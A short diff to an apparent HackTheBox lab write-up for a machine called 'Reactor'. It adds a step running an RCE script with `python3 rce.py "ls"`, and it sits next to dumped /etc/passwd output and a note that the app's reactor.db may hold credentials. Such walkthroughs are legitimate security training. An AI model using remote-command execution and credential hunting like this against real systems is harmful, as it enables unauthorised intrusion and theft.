@@ -1035,7 +1035,9 @@ node:x:999:988::/home/node:/usr/sbin/nologin
 _laurel:x:996:987::/var/log/laurel:/bin/false
 ```
 
+**Command:** `python3 rce.py "ls"`
 
+**Result:**
 
 ```
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
@@ -1052,7 +1054,7 @@ package-lock.json
 reactor.db
 ```
 
-**Key finding:** `reactor.db` — a SQLite database in the application directory.
+**Key finding:** `reactor.db` — a SQLite database present in the application root. Database files in web application directories frequently contain credentials.
 
 You can also use `poc.py` but you'd have to:
 
